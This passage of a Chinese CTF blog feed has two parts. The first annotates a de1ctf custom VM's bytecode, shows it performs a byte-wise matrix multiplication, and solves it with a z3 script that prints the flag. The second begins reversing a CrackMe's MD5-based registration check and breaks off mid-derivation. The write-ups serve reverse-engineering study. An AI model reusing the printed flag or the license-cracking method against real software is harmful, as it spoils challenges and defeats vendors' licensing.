class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-number">0000 </span><span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_6</span><span class="hljs-number">0</span><br><span class="hljs-number">0007 </span><span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_3</span><span class="hljs-number">0</span><br><span class="hljs-string">000e</span> <span class="hljs-string">jmp</span> <span class="hljs-number">0x1d</span><br><br><span class="hljs-attr">Label_1:</span><br><span class="hljs-number">0015 </span><span class="hljs-string">cc</span><br><span class="hljs-number">0016 </span><span class="hljs-string">add</span> <span class="hljs-string">vm_regs_3</span><span class="hljs-number">1</span><br><br><span class="hljs-string">001d</span> <span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">vm_regs_3</span><br><span class="hljs-number">0021 </span><span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_2</span><span class="hljs-string">vm_regs_0</span><br><span class="hljs-number">0025 </span><span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-number">50</span><br><span class="hljs-string">002c</span> <span class="hljs-string">cc</span><br><span class="hljs-string">002d</span> <span class="hljs-string">add</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">vm_regs_2</span><br><span class="hljs-number">0031 </span><span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">Almost[vm_regs_0]</span>   <span class="hljs-comment">#  Almost是原始字符串 这里加50 得到输入的地址</span><br><span class="hljs-number">0035 </span><span class="hljs-string">30c0</span><br><span class="hljs-number">0037 </span><span class="hljs-string">cmp</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-number">0</span>                   <span class="hljs-comment">#  比较是否是字符串结束</span><br><span class="hljs-string">003f</span> <span class="hljs-string">jg</span> <span class="hljs-number">0x15</span>                            <span class="hljs-comment">#  jg Label_1</span><br><br><span class="hljs-number">0046 </span><span class="hljs-string">30c0</span><br><span class="hljs-number">0048 </span><span class="hljs-string">cmp</span> <span class="hljs-string">vm_regs_3</span><span class="hljs-number">70</span>                  <span class="hljs-comment">#  比较长度 长度70</span><br><span class="hljs-number">0050 </span><span class="hljs-string">jeq</span> <span class="hljs-number">0x65</span>                           <span class="hljs-comment"># jmp Label_2</span><br><span class="hljs-number">0057 </span><span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-number">0</span>                   <span class="hljs-comment"># 失败 ret(0)</span><br><span class="hljs-string">005e</span> <span class="hljs-string">jmp</span> <span class="hljs-number">0x23f</span><br><br><span class="hljs-attr">Label_2:</span><br><span class="hljs-number">0065 </span><span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_3</span><span class="hljs-number">0</span>                   <span class="hljs-comment"># vm_regs_3 = i</span><br><span class="hljs-string">006c</span> <span class="hljs-string">jmp</span> <span class="hljs-number">0x1ac</span>                          <span class="hljs-comment"># jmp Label_3</span><br><br><span class="hljs-attr">Label_4:</span><br><span class="hljs-number">0073 </span><span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_4</span><span class="hljs-number">0</span>                   <span class="hljs-comment"># vm_regs_4 = j</span><br><span class="hljs-string">007a</span> <span class="hljs-string">jmp</span> <span class="hljs-number">0x18b</span>                          <span class="hljs-comment"># jmp Label_5</span><br><br><span class="hljs-attr">Label_6:</span><br><span class="hljs-number">0081 </span><span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_6</span><span class="hljs-number">0</span>                   <span class="hljs-comment"># tmp = 0</span><br><span class="hljs-number">0088 </span><span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_5</span><span class="hljs-number">0</span>                   <span class="hljs-comment"># vm_regs_5 = k</span><br><span class="hljs-string">008f</span> <span class="hljs-string">jmp</span> <span class="hljs-number">0x130</span>                          <span class="hljs-comment"># jmp Label_7</span><br><br><span class="hljs-string">Label_8</span><br><span class="hljs-number">0096 </span><span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_2</span><span class="hljs-string">vm_regs_3</span><br><span class="hljs-string">009a</span> <span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">vm_regs_2</span><br><span class="hljs-string">009e</span> <span class="hljs-string">cc</span><br><span class="hljs-string">009f</span> <span class="hljs-string">shl</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-number">3</span>                   <span class="hljs-comment"># i &lt;&lt; 3</span><br><span class="hljs-string">00a6</span> <span class="hljs-string">cc</span><br><span class="hljs-string">00a7</span> <span class="hljs-string">sub</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">vm_regs_2</span>           <span class="hljs-comment"># (i &lt;&lt; 3) - i</span><br><span class="hljs-string">00ab</span> <span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_2</span><span class="hljs-string">vm_regs_0</span>           <span class="hljs-comment"># vm_regs_2 = (i &lt;&lt; 3) - i</span><br><span class="hljs-string">00af</span> <span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">vm_regs_5</span><br><span class="hljs-string">00b3</span> <span class="hljs-string">cc</span><br><span class="hljs-string">00b4</span> <span class="hljs-string">add</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">vm_regs_2</span>           <br><span class="hljs-string">00b8</span> <span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_2</span><span class="hljs-string">vm_regs_0</span>           <span class="hljs-comment"># vm_regs_2 = k + 7 * i</span><br><span class="hljs-string">00bc</span> <span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-number">50</span><br><span class="hljs-string">00c3</span> <span class="hljs-string">cc</span><br><span class="hljs-string">00c4</span> <span class="hljs-string">add</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">vm_regs_2</span>           <span class="hljs-comment"># vm_regs_0 = k + 7 * i + 50</span><br><span class="hljs-string">00c8</span> <span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_1</span><span class="hljs-string">Almost[vm_regs_0]</span>   <span class="hljs-comment"># 得到(i,k)</span><br><span class="hljs-string">00cc</span> <span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_2</span><span class="hljs-string">vm_regs_5</span>           <span class="hljs-comment"># vm_regs_2 = k</span><br><span class="hljs-string">00d0</span> <span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">vm_regs_2</span><br><span class="hljs-string">00d4</span> <span class="hljs-string">cc</span><br><span class="hljs-string">00d5</span> <span class="hljs-string">shl</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-number">3</span>                   <span class="hljs-comment"># vm_regs_0 = k &lt;&lt; 3</span><br><span class="hljs-string">00dc</span> <span class="hljs-string">cc</span><br><span class="hljs-string">00dd</span> <span class="hljs-string">sub</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">vm_regs_2</span>           <span class="hljs-comment"># vm_regs_0 = 7 * k</span><br><span class="hljs-number">00e1</span> <span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_2</span><span class="hljs-string">vm_regs_0</span>           <span class="hljs-comment"># vm_regs_2 = 7 * k</span><br><span class="hljs-number">00e5</span> <span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">vm_regs_4</span>           <span class="hljs-comment"># vm_regs_0 = j</span><br><span class="hljs-number">00e9</span> <span class="hljs-string">cc</span><br><span class="hljs-string">00ea</span> <span class="hljs-string">add</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">vm_regs_2</span>           <span class="hljs-comment"># vm_regs_0 = j + 7 * k</span><br><span class="hljs-string">00ee</span> <span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_2</span><span class="hljs-string">vm_regs_0</span>           <span class="hljs-comment"># vm_regs_2 = j + 7 * k</span><br><span class="hljs-string">00f2</span> <span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-number">0</span><br><span class="hljs-string">00f9</span> <span class="hljs-string">cc</span><br><span class="hljs-string">00fa</span> <span class="hljs-string">add</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">vm_regs_2</span>           <span class="hljs-comment"># vm_regs_0 = j + 7 * k</span><br><span class="hljs-string">00fe</span> <span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_2</span><span class="hljs-string">Almost[vm_regs_0]</span>   <span class="hljs-comment"># vm_regs_2 = Almost[j + 7 * k]</span><br><span class="hljs-number">0102 </span><span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">vm_regs_1</span>           <span class="hljs-comment"># vm_regs_0 = (k,j)</span><br><span class="hljs-number">0106 </span><span class="hljs-string">cc</span><br><span class="hljs-number">0107 </span><span class="hljs-string">mul</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">vm_regs_2</span>           <span class="hljs-comment"># vm_regs_0 = Input(i,k) * Src(k,j)</span><br><span class="hljs-string">010b</span> <span class="hljs-string">cc</span><br><span class="hljs-string">010c</span> <span class="hljs-string">mod</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-number">256</span>                 <span class="hljs-comment"># vm_regs_0 = vm_regs_0 % 256</span><br><span class="hljs-number">0113 </span><span class="hljs-string">cc</span><br><span class="hljs-number">0114 </span><span class="hljs-string">add</span> <span class="hljs-string">vm_regs_6</span><span class="hljs-string">vm_regs_0</span>           <span class="hljs-comment"># tmp += vm_regs_0</span><br><span class="hljs-number">0118 </span><span class="hljs-string">cc</span><br><span class="hljs-number">0119 </span><span class="hljs-string">mod</span> <span class="hljs-string">vm_regs_6</span><span class="hljs-number">256</span>                 <span class="hljs-comment"># tmp %= 256</span><br><span class="hljs-number">0120 </span><span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">vm_regs_5</span>           <span class="hljs-comment"># vm_regs_0 = k</span><br><span class="hljs-number">0124 </span><span class="hljs-string">cc</span><br><span class="hljs-number">0125 </span><span class="hljs-string">add</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-number">1</span>                   <span class="hljs-comment"># vm_regs_0 += 1 </span><br><span class="hljs-string">012c</span> <span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_5</span><span class="hljs-string">vm_regs_0</span>           <span class="hljs-comment"># k += 1</span><br><br><span class="hljs-attr">Label_7:</span><br><span class="hljs-number">0130 </span><span class="hljs-string">30c0</span><br><span class="hljs-number">0132 </span><span class="hljs-string">cmp</span> <span class="hljs-string">vm_regs_5</span><span class="hljs-number">6</span><br><span class="hljs-string">013a</span> <span class="hljs-string">jle</span> <span class="hljs-number">0x96</span>                           <span class="hljs-comment"># jmp Label_8</span><br><br><span class="hljs-number">0141 </span><span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_2</span><span class="hljs-string">vm_regs_3</span>           <span class="hljs-comment"># vm_regs_2 = i</span><br><span class="hljs-number">0145 </span><span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">vm_regs_2</span><br><span class="hljs-number">0149 </span><span class="hljs-string">cc</span><br><span class="hljs-string">014a</span> <span class="hljs-string">shl</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-number">3</span><br><span class="hljs-number">0151 </span><span class="hljs-string">cc</span><br><span class="hljs-number">0152 </span><span class="hljs-string">sub</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">vm_regs_2</span>           <br><span class="hljs-number">0156 </span><span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_2</span><span class="hljs-string">vm_regs_0</span>           <span class="hljs-comment"># vm_regs_2 = 7 * i</span><br><span class="hljs-string">015a</span> <span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">vm_regs_4</span>           <span class="hljs-comment"># vm_regs_0 = j</span><br><span class="hljs-string">015e</span> <span class="hljs-string">cc</span><br><span class="hljs-string">015f</span> <span class="hljs-string">add</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">vm_regs_2</span>           <span class="hljs-comment"># vm_regs_0 = 7 * i + j</span><br><span class="hljs-number">0163 </span><span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_2</span><span class="hljs-string">vm_regs_0</span><br><span class="hljs-number">0167 </span><span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-number">150</span><br><span class="hljs-string">016e</span> <span class="hljs-string">cc</span><br><span class="hljs-string">016f</span> <span class="hljs-string">add</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">vm_regs_2</span>           <span class="hljs-comment"># vm_regs_0 = 7 * i + j + 150</span><br><span class="hljs-number">0173 </span><span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_1</span><span class="hljs-string">vm_regs_6</span>           <span class="hljs-comment"># vm_regs_1 = tmp</span><br><span class="hljs-number">0177 </span><span class="hljs-string">mov</span> <span class="hljs-string">Almost[vm_regs_0]</span><span class="hljs-string">vm_regs_1</span>   <span class="hljs-comment"># Almost[7 * i + j + 150] = tmp</span><br><span class="hljs-string">017b</span> <span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">vm_regs_4</span><br><span class="hljs-string">017f</span> <span class="hljs-string">cc</span><br><span class="hljs-number">0180 </span><span class="hljs-string">add</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-number">1</span><br><span class="hljs-number">0187 </span><span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_4</span><span class="hljs-string">vm_regs_0</span>           <span class="hljs-comment"># j += 1</span><br><br><span class="hljs-attr">Label_5:</span><br><span class="hljs-string">018b</span> <span class="hljs-string">30c0</span><br><span class="hljs-string">018d</span> <span class="hljs-string">cmp</span> <span class="hljs-string">vm_regs_4</span><span class="hljs-number">6</span><br><span class="hljs-number">0195 </span><span class="hljs-string">jle</span> <span class="hljs-number">0x81</span>                           <span class="hljs-comment"># jmp label_6</span><br><br><span class="hljs-string">019c</span> <span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">vm_regs_3</span><br><span class="hljs-string">01a0</span> <span class="hljs-string">cc</span><br><span class="hljs-string">01a1</span> <span class="hljs-string">add</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-number">1</span><br><span class="hljs-string">01a8</span> <span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_3</span><span class="hljs-string">vm_regs_0</span>           <span class="hljs-comment"># k += 1</span><br>        <br><span class="hljs-string">Label_3</span><br><span class="hljs-string">01ac</span> <span class="hljs-string">30c0</span><br><span class="hljs-string">01ae</span> <span class="hljs-string">cmp</span> <span class="hljs-string">vm_regs_3</span><span class="hljs-number">9</span><br><span class="hljs-string">01b6</span> <span class="hljs-string">jle</span> <span class="hljs-number">0x73</span>                           <span class="hljs-comment"># jmp Label_4</span><br><br><span class="hljs-comment"># 检验</span><br><span class="hljs-string">01bd</span> <span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_3</span><span class="hljs-number">0</span>                   <span class="hljs-comment"># i = 0</span><br><span class="hljs-string">01c4</span> <span class="hljs-string">jmp</span> <span class="hljs-number">0x227</span>                          <span class="hljs-comment"># jmp Label_9</span><br><br><span class="hljs-string">Label_10</span><br><span class="hljs-string">01cb</span> <span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">vm_regs_3</span><br><span class="hljs-string">01cf</span> <span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_2</span><span class="hljs-string">vm_regs_0</span><br><span class="hljs-string">01d3</span> <span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-number">150</span><br><span class="hljs-string">01da</span> <span class="hljs-string">cc</span><br><span class="hljs-string">01db</span> <span class="hljs-string">add</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">vm_regs_2</span>           <span class="hljs-comment"># vm_regs_0 = i + 150</span><br><span class="hljs-string">01df</span> <span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_1</span><span class="hljs-string">Almost[vm_regs_0]</span>   <span class="hljs-comment"># vm_regs_1 = Almost[i + 150]</span><br><span class="hljs-number">01e3</span> <span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">vm_regs_3</span><br><span class="hljs-number">01e7</span> <span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_2</span><span class="hljs-string">vm_regs_0</span><br><span class="hljs-string">01eb</span> <span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-number">250</span><br><span class="hljs-string">01f2</span> <span class="hljs-string">cc</span><br><span class="hljs-string">01f3</span> <span class="hljs-string">add</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">vm_regs_2</span>          <span class="hljs-comment"># vm_regs_0 = i + 250</span><br><span class="hljs-string">01f7</span> <span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">Almost[vm_regs_0]</span>  <span class="hljs-comment"># vm_regs_0 = Almost[i + 250]</span><br><span class="hljs-string">01fb</span> <span class="hljs-string">30c0</span><br><span class="hljs-string">01fd</span> <span class="hljs-string">cmp</span> <span class="hljs-string">vm_regs_1</span><span class="hljs-string">vm_regs_0</span><br><span class="hljs-number">0202 </span><span class="hljs-string">jeq</span> <span class="hljs-number">0x217</span><br><br><span class="hljs-number">0209 </span><span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-number">0</span><br><span class="hljs-number">0210 </span><span class="hljs-string">jmp</span> <span class="hljs-number">0x23f</span><br><br><span class="hljs-number">0217 </span><span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-string">vm_regs_3</span><br><span class="hljs-string">021b</span> <span class="hljs-string">cc</span><br><span class="hljs-string">021c</span> <span class="hljs-string">add</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-number">1</span><br><span class="hljs-number">0223 </span><span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_3</span><span class="hljs-string">vm_regs_0</span><br><span class="hljs-number">0227 </span><span class="hljs-string">30c0</span><br><span class="hljs-number">0229 </span><span class="hljs-string">cmp</span> <span class="hljs-string">vm_regs_3</span><span class="hljs-number">69</span><br><span class="hljs-number">0231 </span><span class="hljs-string">jle</span> <span class="hljs-number">0x1cb</span>                      <span class="hljs-comment"># jmp Label_10</span><br><br><span class="hljs-number">0238 </span><span class="hljs-string">mov</span> <span class="hljs-string">vm_regs_0</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>阅读汇编，发现就是简单做了一个矩阵相乘的运算，我们输入70个字符相当于<code>10*7</code>的矩阵，然后和原始49个字符的<code>7*7</code>矩阵相乘，再作比较</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>最后就是简单用z3来解方程了，不能直接算逆矩阵是因为原来运算都是字节型的，会有数据损失</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># [10,7] * [7,7] = [10,7]</span><br>enc = [[<span class="hljs-number">0xD6</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x60</span>],<br>       [<span class="hljs-number">0x62</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x97</span>],<br>       [<span class="hljs-number">0xEB</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x83</span>],<br>       [<span class="hljs-number">0x29</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x17</span>],<br>       [<span class="hljs-number">0x7C</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xC7</span>],<br>       [<span class="hljs-number">0x9C</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xCD</span>],<br>       [<span class="hljs-number">0x37</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xDA</span>],<br>       [<span class="hljs-number">0xD8</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x46</span>],<br>       [<span class="hljs-number">0x0B</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xC4</span>],<br>       [<span class="hljs-number">0xD0</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x51</span>]]<br><br>src = [[<span class="hljs-number">0x41</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x20</span>],<br>       [<span class="hljs-number">0x68</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x20</span>],<br>       [<span class="hljs-number">0x77</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x69</span>],<br>       [<span class="hljs-number">0x72</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x2C</span>],<br>       [<span class="hljs-number">0x20</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x72</span>],<br>       [<span class="hljs-number">0x69</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x6F</span>],<br>       [<span class="hljs-number">0x75</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x73</span>]]<br><br>input_ = [[BitVec(<span class="hljs-string">&#x27;input_%s_%s&#x27;</span> % (i, j), <span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>)] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)]<br>s = Solver()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        tmp = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>            <span class="hljs-comment"># t = src[k][j]</span><br>            tmp += input_[i][k] * src[k][j]<br>        s.add(tmp == enc[i][j])<br><br>s.check()<br>m = s.model()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> input_:<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> i:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(m[k].as_long()),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment"># de1ctf&#123;7h3n_f4r3_u_w3ll_5w337_cr4g13_HILL_wh3r3_0f3n_71m35_1_v3_r0v3d&#125;</span><br></code></pre></td></tr></table></figure><h2 id="signal-vm-delta"><a href="#signal-vm-delta" class="headerlink" title="signal-vm-delta"></a>signal-vm-delta</h2><p>待做&gt;_&lt;</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>题目复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>z3</tag>
      
      <tag>vm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CrackMe_注册码</title>
    <link href="/2024/01/19/Register_MD5/"/>
    <url>/2024/01/19/Register_MD5/</url>
    
    <content type="html"><![CDATA[<p>记录一道CrackMe</p><span id="more"></span><h2 id="Crack"><a href="#Crack" class="headerlink" title="Crack"></a>Crack</h2><p>题目逻辑很简单，题目内置一个<code>machine id</code>，然后需要输入<code>user name</code>和<code>key</code>，再进行验证</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-19%2021.39.40.png"></p><p>继续往下分析，会出现两个加密的函数<code>sub_7FF7425F1000</code>和<code>sub_7FF7425F10E0</code>，通过加密常量和调试分析可以确定这两个函数实际作用是进行MD5加密。</p><p>在经过MD5加密后，继续进行一个加密，这里用到大量的SIMD指令，粗略查看这里面涉及到打乱、乘法、相加等操作，可以先暂且跳过，不详细跟。</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-19%2021.42.25.png"></p><p>在对得到的MD5密文加密后，得到一个新的密文。</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-19%2021.46.39.png"></p><p>然后继续对<code>user_id</code>作相同的处理</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-19%2021.47.10.png"></p><p>得到密文</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-19%2021.47.54.png"></p><p>再将两个密文作拼接操作</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-19%2021.48.21.png"></p><p>得到新的密文</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-19%2021.48.43.png"></p><p>然后再对新的密文作两次完全一样的加密，即先MD5然后SIMD指令加密，这样操作两次</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-19%2021.49.03.png"></p><p>最后对输入的key进行相同的加密</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-19%2021.50.43.png"></p><p>最终进行比较</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-19%2021.51.06.png"></p><p>回顾整个加密比较流程，用<code>F</code>表示MD5和SIMD加密，那么<code>machine_code</code> 、<code>user_id</code>和<code>key</code>之间应该满足如下关系</p><blockquote><p>F(key) &#x3D; 